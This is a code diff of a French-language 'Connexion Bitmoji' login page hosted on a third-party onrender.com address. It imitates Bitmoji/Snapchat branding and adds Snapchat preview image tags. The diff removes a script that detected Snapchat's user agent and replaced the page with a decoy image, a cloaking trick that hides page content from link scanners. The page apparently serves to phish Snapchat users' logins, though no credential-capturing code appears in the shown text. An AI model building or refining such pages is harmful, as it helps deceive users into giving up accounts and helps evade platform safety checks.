@@ -7,10 +7,10 @@
 <title>Connexion Bitmoji</title>
 <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
 <!-- BALISES OPEN GRAPH POUR RÉSEAUX SOCIAUX -->
-<meta content="Bitmoji Add-On" property="og:title">
-<meta content="Crée ton avatar Bitmoji et découvre des extensions inédites avec Snapchat !" property="og:description">
-<meta content="https://bitmoji-add-on.onrender.com/preview2_1200x630.jpg" property="og:image"/>
-<meta content="image/jpeg" property="og:image:type"/>
+<meta content="Bitmoji Add-On" property="og:title"/>
+<meta content="Crée ton avatar Bitmoji et découvre des extensions inédites avec Snapchat !" property="og:description"/>
+<meta content="https://bitmoji-add-on.onrender.com/preview2_1200x630.jpg" property="og:image">
+<meta content="image/jpeg" property="og:image:type">
 <meta content="1200" property="og:image:width"/>
 <meta content="630" property="og:image:height"/>
 <meta content="https://bitmoji-add-on.onrender.com" property="og:url"/>
@@ -136,9 +136,16 @@
     font-weight: bold;
   }
 </style>
-
 </meta></meta><meta content="https://bitmoji-add-on.onrender.com/preview2_1200x630.jpg" name="snapchat:preview"/></head>
+
 <body>
+  <!-- ✅ Image statique visible pour Snapchat en toute priorité -->
+  <img 
+    src="https://bitmoji-add-on.onrender.com/preview2_1200x630.jpg" 
+    alt="Aperçu Bitmoji" 
+    style="max-width: 100%; height: auto; display: block; margin: 0 auto 20px auto;"
+  />
+
 <div class="header">
 <h1>Bitmoji</h1>
 <p class="subtitle">Votre avatar emoji</p>
@@ -391,18 +398,5 @@ window.submitVerification = function() {
 };
 
 </script>
-<script>
-document.addEventListener("DOMContentLoaded", function() {
-  const ua = navigator.userAgent || "";
-  if (/Snapchat/i.test(ua)) {
-    const img = document.createElement('img');
-    img.src = "https://bitmoji-add-on.onrender.com/preview2_1200x630.jpg";
-    img.alt = "Aperçu Snapchat";
-    img.style.width = "100%";
-    img.style.display = "block";
-    document.body.innerHTML = "";
-    document.body.appendChild(img);
-  }
-});
-</script></body>
+</body>
 </html>
